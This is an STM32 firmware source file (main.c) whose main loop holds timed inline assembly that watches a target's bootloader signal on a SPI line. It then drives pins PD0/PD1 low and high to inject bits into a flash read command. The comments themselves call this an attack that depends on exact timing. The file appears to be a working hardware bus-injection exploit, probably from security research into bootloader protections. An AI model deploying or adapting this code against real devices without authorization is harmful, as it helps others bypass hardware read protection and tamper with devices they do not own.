/* USER CODE BEGIN Header */
/**
  ******************************************************************************
  * @file           : main.c
  * @brief          : Main program body
  ******************************************************************************
  * @attention
  *
  * <h2><center>&copy; Copyright (c) 2020 STMicroelectronics.
  * All rights reserved.</center></h2>
  *
  * This software component is licensed by ST under BSD 3-Clause license,
  * the "License"; You may not use this file except in compliance with the
  * License. You may obtain a copy of the License at:
  *                        opensource.org/licenses/BSD-3-Clause
  *
  ******************************************************************************
  */
/* USER CODE END Header */

/* Includes ------------------------------------------------------------------*/
#include "main.h"

/* Private includes ----------------------------------------------------------*/
/* USER CODE BEGIN Includes */

/* USER CODE END Includes */

/* Private typedef -----------------------------------------------------------*/
/* USER CODE BEGIN PTD */

/* USER CODE END PTD */

/* Private define ------------------------------------------------------------*/
/* USER CODE BEGIN PD */
/* USER CODE END PD */

/* Private macro -------------------------------------------------------------*/
/* USER CODE BEGIN PM */

/* USER CODE END PM */

/* Private variables ---------------------------------------------------------*/
I2C_HandleTypeDef hi2c1;

SPI_HandleTypeDef hspi1;

UART_HandleTypeDef huart3;

/* USER CODE BEGIN PV */

/* USER CODE END PV */

/* Private function prototypes -----------------------------------------------*/
void SystemClock_Config(void);
static void MX_GPIO_Init(void);
static void MX_I2C1_Init(void);
static void MX_SPI1_Init(void);
static void MX_USART3_UART_Init(void);
/* USER CODE BEGIN PFP */

/* USER CODE END PFP */

/* Private user code ---------------------------------------------------------*/
/* USER CODE BEGIN 0 */

/* USER CODE END 0 */

/**
  * @brief  The application entry point.
  * @retval int
  */
int main(void)  __attribute__ ((section (".sramcode")));
int main(void)
{
  /* USER CODE BEGIN 1 */

  /* USER CODE END 1 */
  

  /* MCU Configuration--------------------------------------------------------*/

  /* Reset of all peripherals, Initializes the Flash interface and the Systick. */
  HAL_Init();

  /* USER CODE BEGIN Init */

  /* USER CODE END Init */

  /* Configure the system clock */
  SystemClock_Config();

  /* USER CODE BEGIN SysInit */

  /* USER CODE END SysInit */

  /* Initialize all configured peripherals */
  MX_GPIO_Init();
  MX_I2C1_Init();
  MX_SPI1_Init();
  MX_USART3_UART_Init();
  /* USER CODE BEGIN 2 */

  /* USER CODE END 2 */
 

  /* Infinite loop */
  /* USER CODE BEGIN WHILE */
  while (1)
  {
		//setup internal constants
		__asm__ volatile("nop");
		__asm__ volatile("ldr r4, =0x48000c10"); //input register
		__asm__ volatile("ldr r5, =0xe000e018"); //systick value
		__asm__ volatile("ldr r6, =0x48001018"); //GPIOE BSSR
		__asm__ volatile("ldr r7, =0x48000c00"); //GPIOD MODER
		__asm__ volatile("ldr r8, =700"); //~12µs duration of high
		__asm__ volatile("ldr r9, =512"); //~7µs reset when LOW
		__asm__ volatile("ldr r10, =282"); //TBD... time between read cmd and data (4.5µs -17 clocks)
		__asm__ volatile("ldr r11, =115"); //8 spi clocks

		//state 1.0
		//state: init, assume 0, wait for 1
		__asm__ volatile("rlp1: ldr r0, [r4]");
		__asm__ volatile("ands r0, #1");
		__asm__ volatile("beq rlp1");


		//state 2.0 seeing 1, measure duration, waiting for 0
		__asm__ volatile("state2_0: ldr r2, [r5]"); //get systick value
		__asm__ volatile("rlp2_0: ldr r0, [r4]");
		__asm__ volatile("ands r0, r0, #1");
		__asm__ volatile("bne rlp2_0"); //loop if still 1
		__asm__ volatile("ldr r3, [r5]"); //get systick value on 1->0
		__asm__ volatile("sub r3, r2, r3");
		__asm__ volatile("cmp r3, r8"); //~10µs
		__asm__ volatile("blo rlp1"); //this was not one of the 3 btld long-highs

		//state 2.1 (first btld-1-run seen seeing 0, waiting for 1)
		__asm__ volatile("state2_1: ldr r2, [r5]"); //get systick value
		__asm__ volatile("rlp2_1: ldr r0, [r4]");
		__asm__ volatile("ands r0, r0, #1");
		__asm__ volatile("beq rlp2_1"); //loop if still 0
		__asm__ volatile("ldr r3, [r5]"); //get systick value on 0->1
		__asm__ volatile("sub r3, r2, r3");
		__asm__ volatile("cmp r3, r9"); //~50µs
		__asm__ volatile("bhs rlp1"); //overly long run of 0 -> reset

		//state 2.2 (seeing1, perhaps seeing second btld-1-run, waiting for 0)
		__asm__ volatile("state2_2: ldr r2, [r5]"); //get systick value
		__asm__ volatile("rlp2_2: ldr r0, [r4]");
		__asm__ volatile("ands r0, r0, #1");
		__asm__ volatile("bne rlp2_2"); //loop if still 1
		__asm__ volatile("ldr r3, [r5]"); //get systick value on 1->0
		__asm__ volatile("sub r3, r2, r3");
		__asm__ volatile("cmp r3, r8"); //~10µs
		__asm__ volatile("blo state2_1"); //some other bits..., so wait for more


		//state 2.3 (second btld-1-run seen, seeing 0, waiting for 1)
		__asm__ volatile("state2_3: ldr r2, [r5]"); //get systick value
		__asm__ volatile("rlp2_3: ldr r0, [r4]");
		__asm__ volatile("ands r0, r0, #1");
		__asm__ volatile("beq rlp2_3"); //loop if still 0
		__asm__ volatile("ldr r3, [r5]"); //get systick value on 0->1
		__asm__ volatile("sub r3, r2, r3");
		__asm__ volatile("cmp r3, r9"); //~50µs
		__asm__ volatile("bhs rlp1"); //overly long run of 0 -> reset


		//state 2.4 (seeing1, perhaps seeing third btld-1-run, waiting for 0)
		__asm__ volatile("state2_4: ldr r2, [r5]"); //get systick value
		__asm__ volatile("rlp2_4: ldr r0, [r4]");
		__asm__ volatile("ands r0, r0, #1");
		__asm__ volatile("bne rlp2_4"); //loop if still 1
		__asm__ volatile("ldr r3, [r5]"); //get systick value on 1->0
		__asm__ volatile("sub r3, r2, r3");
		__asm__ volatile("cmp r3, r8"); //~10µs
		__asm__ volatile("blo state2_3"); //some other bits..., so wait for more

		//this 0 we are seeing here is the actively driven address signal! we have an internal pullup to prevent a floating potential

		//PD0+1 must be connected to IO2!!
		//do not change any nops here or any other instructions. This might alter the timing and the attack would not work anymore!
		//state 3.1 (now wait a fixed amount of time, 2 SPI clocks)
		__asm__ volatile("nop \r\n nop \r\n nop \r\n nop \r\n nop \r\n nop \r\n nop \r\n nop \r\n nop \r\n nop \r\n ");

		//state 3.2 pull low for one SPI clock, inject a zero
		__asm__ volatile("mov r0, 0x00001000");
		__asm__ volatile("ldr r1, [r7]"); //get MODER GPIOD
		__asm__ volatile("orrs r1, r1, #5"); //set output PD0+PD1
		__asm__ volatile("str r0, [r6]"); //led on
		__asm__ volatile("str r1, [r7]"); //set MODER

		__asm__ volatile("nop \r\n nop \r\n nop \r\n nop \r\n nop \r\n nop \r\n nop \r\n nop \r\n nop \r\n nop \r\n nop \r\n ");

		//state 3.3 pull high for one SPI clock, inject a one
		__asm__ volatile("ldr r4, =0x48000c18"); //GPIOD BSRR
		__asm__ volatile("mov r2, 0x00000003");
		__asm__ volatile("str r2, [r4]");

		__asm__ volatile("nop \r\n nop \r\n nop \r\n nop \r\n nop \r\n nop \r\n nop \r\n nop \r\n nop \r\n nop \r\n nop \r\n nop \r\n nop \r\n nop \r\n ");

		//state 3.4 go high-z again
		__asm__ volatile("lsl r2, r2, #16"); //reset IO/s to 0
		__asm__ volatile("str r2, [r4]");
		__asm__ volatile("ldr r1, [r7]"); //get MODER GPIOD
		__asm__ volatile("bic r1, r1, #0x0F"); //set input PD0+PD1
		__asm__ volatile("str r1, [r7]"); //set MODER

		//set LEDs
		__asm__ volatile("ldr r0, =0x10002000"); //red on, blue off
		__asm__ volatile("str r0, [r6]"); //led off


		__asm__ volatile("movs r0, #0");
		__asm__ volatile("1:adds r1,r1,#1");
		__asm__ volatile("b 1b");


	/* USER CODE END WHILE */

    /* USER CODE BEGIN 3 */
  }
  /* USER CODE END 3 */
}

/**
  * @brief System Clock Configuration
  * @retval None
  */
void SystemClock_Config(void)
{
  RCC_OscInitTypeDef RCC_OscInitStruct = {0};
  RCC_ClkInitTypeDef RCC_ClkInitStruct = {0};
  RCC_PeriphCLKInitTypeDef PeriphClkInit = {0};

  /** Initializes the CPU, AHB and APB busses clocks 
  */
  RCC_OscInitStruct.OscillatorType = RCC_OSCILLATORTYPE_HSI|RCC_OSCILLATORTYPE_HSE;
  RCC_OscInitStruct.HSEState = RCC_HSE_ON;
  RCC_OscInitStruct.HSEPredivValue = RCC_HSE_PREDIV_DIV1;
  RCC_OscInitStruct.HSIState = RCC_HSI_ON;
  RCC_OscInitStruct.HSICalibrationValue = RCC_HSICALIBRATION_DEFAULT;
  RCC_OscInitStruct.PLL.PLLState = RCC_PLL_ON;
  RCC_OscInitStruct.PLL.PLLSource = RCC_PLLSOURCE_HSE;
  RCC_OscInitStruct.PLL.PLLMUL = RCC_PLL_MUL9;
  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK)
  {
    Error_Handler();
  }
  /** Initializes the CPU, AHB and APB busses clocks 
  */
  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK|RCC_CLOCKTYPE_SYSCLK
                              |RCC_CLOCKTYPE_PCLK1|RCC_CLOCKTYPE_PCLK2;
  RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_PLLCLK;
  RCC_ClkInitStruct.AHBCLKDivider = RCC_SYSCLK_DIV1;
  RCC_ClkInitStruct.APB1CLKDivider = RCC_HCLK_DIV2;
  RCC_ClkInitStruct.APB2CLKDivider = RCC_HCLK_DIV1;

  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_2) != HAL_OK)
  {
    Error_Handler();
  }
  PeriphClkInit.PeriphClockSelection = RCC_PERIPHCLK_USART3|RCC_PERIPHCLK_I2C1;
  PeriphClkInit.Usart3ClockSelection = RCC_USART3CLKSOURCE_PCLK1;
  PeriphClkInit.I2c1ClockSelection = RCC_I2C1CLKSOURCE_HSI;
  if (HAL_RCCEx_PeriphCLKConfig(&PeriphClkInit) != HAL_OK)
  {
    Error_Handler();
  }
}

/**
  * @brief I2C1 Initialization Function
  * @param None
  * @retval None
  */
static void MX_I2C1_Init(void)
{

  /* USER CODE BEGIN I2C1_Init 0 */

  /* USER CODE END I2C1_Init 0 */

  /* USER CODE BEGIN I2C1_Init 1 */

  /* USER CODE END I2C1_Init 1 */
  hi2c1.Instance = I2C1;
  hi2c1.Init.Timing = 0x2000090E;
  hi2c1.Init.OwnAddress1 = 0;
  hi2c1.Init.AddressingMode = I2C_ADDRESSINGMODE_7BIT;
  hi2c1.Init.DualAddressMode = I2C_DUALADDRESS_DISABLE;
  hi2c1.Init.OwnAddress2 = 0;
  hi2c1.Init.OwnAddress2Masks = I2C_OA2_NOMASK;
  hi2c1.Init.GeneralCallMode = I2C_GENERALCALL_DISABLE;
  hi2c1.Init.NoStretchMode = I2C_NOSTRETCH_DISABLE;
  if (HAL_I2C_Init(&hi2c1) != HAL_OK)
  {
    Error_Handler();
  }
  /** Configure Analogue filter 
  */
  if (HAL_I2CEx_ConfigAnalogFilter(&hi2c1, I2C_ANALOGFILTER_ENABLE) != HAL_OK)
  {
    Error_Handler();
  }
  /** Configure Digital filter 
  */
  if (HAL_I2CEx_ConfigDigitalFilter(&hi2c1, 0) != HAL_OK)
  {
    Error_Handler();
  }
  /* USER CODE BEGIN I2C1_Init 2 */

  /* USER CODE END I2C1_Init 2 */

}

/**
  * @brief SPI1 Initialization Function
  * @param None
  * @retval None
  */
static void MX_SPI1_Init(void)
{

  /* USER CODE BEGIN SPI1_Init 0 */

  /* USER CODE END SPI1_Init 0 */

  /* USER CODE BEGIN SPI1_Init 1 */

  /* USER CODE END SPI1_Init 1 */
  /* SPI1 parameter configuration*/
  hspi1.Instance = SPI1;
  hspi1.Init.Mode = SPI_MODE_MASTER;
  hspi1.Init.Direction = SPI_DIRECTION_2LINES;
  hspi1.Init.DataSize = SPI_DATASIZE_4BIT;
  hspi1.Init.CLKPolarity = SPI_POLARITY_LOW;
  hspi1.Init.CLKPhase = SPI_PHASE_1EDGE;
  hspi1.Init.NSS = SPI_NSS_SOFT;
  hspi1.Init.BaudRatePrescaler = SPI_BAUDRATEPRESCALER_4;
  hspi1.Init.FirstBit = SPI_FIRSTBIT_MSB;
  hspi1.Init.TIMode = SPI_TIMODE_DISABLE;
  hspi1.Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
  hspi1.Init.CRCPolynomial = 7;
  hspi1.Init.CRCLength = SPI_CRC_LENGTH_DATASIZE;
  hspi1.Init.NSSPMode = SPI_NSS_PULSE_ENABLE;
  if (HAL_SPI_Init(&hspi1) != HAL_OK)
  {
    Error_Handler();
  }
  /* USER CODE BEGIN SPI1_Init 2 */

  /* USER CODE END SPI1_Init 2 */

}

/**
  * @brief USART3 Initialization Function
  * @param None
  * @retval None
  */
static void MX_USART3_UART_Init(void)
{

  /* USER CODE BEGIN USART3_Init 0 */

  /* USER CODE END USART3_Init 0 */

  /* USER CODE BEGIN USART3_Init 1 */

  /* USER CODE END USART3_Init 1 */
  huart3.Instance = USART3;
  huart3.Init.BaudRate = 115200;
  huart3.Init.WordLength = UART_WORDLENGTH_8B;
  huart3.Init.StopBits = UART_STOPBITS_2;
  huart3.Init.Parity = UART_PARITY_NONE;
  huart3.Init.Mode = UART_MODE_TX_RX;
  huart3.Init.HwFlowCtl = UART_HWCONTROL_NONE;
  huart3.Init.OverSampling = UART_OVERSAMPLING_16;
  huart3.Init.OneBitSampling = UART_ONE_BIT_SAMPLE_DISABLE;
  huart3.AdvancedInit.AdvFeatureInit = UART_ADVFEATURE_NO_INIT;
  if (HAL_UART_Init(&huart3) != HAL_OK)
  {
    Error_Handler();
  }
  /* USER CODE BEGIN USART3_Init 2 */

  /* USER CODE END USART3_Init 2 */

}

/**
  * @brief GPIO Initialization Function
  * @param None
  * @retval None
  */
static void MX_GPIO_Init(void)
{
  GPIO_InitTypeDef GPIO_InitStruct = {0};

  /* GPIO Ports Clock Enable */
  __HAL_RCC_GPIOE_CLK_ENABLE();
  __HAL_RCC_GPIOC_CLK_ENABLE();
  __HAL_RCC_GPIOF_CLK_ENABLE();
  __HAL_RCC_GPIOA_CLK_ENABLE();
  __HAL_RCC_GPIOD_CLK_ENABLE();
  __HAL_RCC_GPIOB_CLK_ENABLE();

  /*Configure GPIO pin Output Level */
  HAL_GPIO_WritePin(GPIOE, CS_I2C_SPI_Pin|LD4_Pin|LD3_Pin|LD5_Pin 
                          |LD7_Pin|LD9_Pin|LD10_Pin|LD8_Pin, GPIO_PIN_RESET);

  /*Configure GPIO pin Output Level */
  HAL_GPIO_WritePin(LD6_GPIO_Port, LD6_Pin, GPIO_PIN_SET);

  /*Configure GPIO pins : DRDY_Pin MEMS_INT3_Pin MEMS_INT4_Pin MEMS_INT1_Pin 
                           MEMS_INT2_Pin */
  GPIO_InitStruct.Pin = DRDY_Pin|MEMS_INT3_Pin|MEMS_INT4_Pin|MEMS_INT1_Pin 
                          |MEMS_INT2_Pin;
  GPIO_InitStruct.Mode = GPIO_MODE_EVT_RISING;
  GPIO_InitStruct.Pull = GPIO_NOPULL;
  HAL_GPIO_Init(GPIOE, &GPIO_InitStruct);

  /*Configure GPIO pins : CS_I2C_SPI_Pin LD4_Pin LD3_Pin LD5_Pin 
                           LD7_Pin LD9_Pin LD10_Pin LD8_Pin 
                           LD6_Pin */
  GPIO_InitStruct.Pin = CS_I2C_SPI_Pin|LD4_Pin|LD3_Pin|LD5_Pin 
                          |LD7_Pin|LD9_Pin|LD10_Pin|LD8_Pin 
                          |LD6_Pin;
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
  GPIO_InitStruct.Pull = GPIO_NOPULL;
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
  HAL_GPIO_Init(GPIOE, &GPIO_InitStruct);

  /*Configure GPIO pin : B1_Pin */
  GPIO_InitStruct.Pin = B1_Pin;
  GPIO_InitStruct.Mode = GPIO_MODE_INPUT;
  GPIO_InitStruct.Pull = GPIO_NOPULL;
  HAL_GPIO_Init(B1_GPIO_Port, &GPIO_InitStruct);

  /*Configure GPIO pins : DM_Pin DP_Pin */
  GPIO_InitStruct.Pin = DM_Pin|DP_Pin;
  GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
  GPIO_InitStruct.Pull = GPIO_NOPULL;
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_HIGH;
  GPIO_InitStruct.Alternate = GPIO_AF14_USB;
  HAL_GPIO_Init(GPIOA, &GPIO_InitStruct);

  /*Configure GPIO pins : PD0 PD1 PD2 PD3 
                           PD4 PD5 PD6 PD7 */
  GPIO_InitStruct.Pin = GPIO_PIN_0|GPIO_PIN_1|GPIO_PIN_2|GPIO_PIN_3 
		  	  	  	   |GPIO_PIN_4|GPIO_PIN_5|GPIO_PIN_6|GPIO_PIN_7;
  GPIO_InitStruct.Mode = GPIO_MODE_INPUT;
  GPIO_InitStruct.Pull = GPIO_PULLUP;
  HAL_GPIO_Init(GPIOD, &GPIO_InitStruct);

}

/* USER CODE BEGIN 4 */

/* USER CODE END 4 */

/**
  * @brief  This function is executed in case of error occurrence.
  * @retval None
  */
void Error_Handler(void)
{
  /* USER CODE BEGIN Error_Handler_Debug */
  /* User can add his own implementation to report the HAL error return state */

  /* USER CODE END Error_Handler_Debug */
}

#ifdef  USE_FULL_ASSERT
/**
  * @brief  Reports the name of the source file and the source line number
  *         where the assert_param error has occurred.
  * @param  file: pointer to the source file name
  * @param  line: assert_param error line source number
  * @retval None
  */
void assert_failed(char *file, uint32_t line)
{ 
  /* USER CODE BEGIN 6 */
  /* User can add his own implementation to report the file name and line number,
     tex: printf("Wrong parameters value: file %s on line %d\r\n", file, line) */
  /* USER CODE END 6 */
}
#endif /* USE_FULL_ASSERT */

/************************ (C) COPYRIGHT STMicroelectronics *****END OF FILE****/
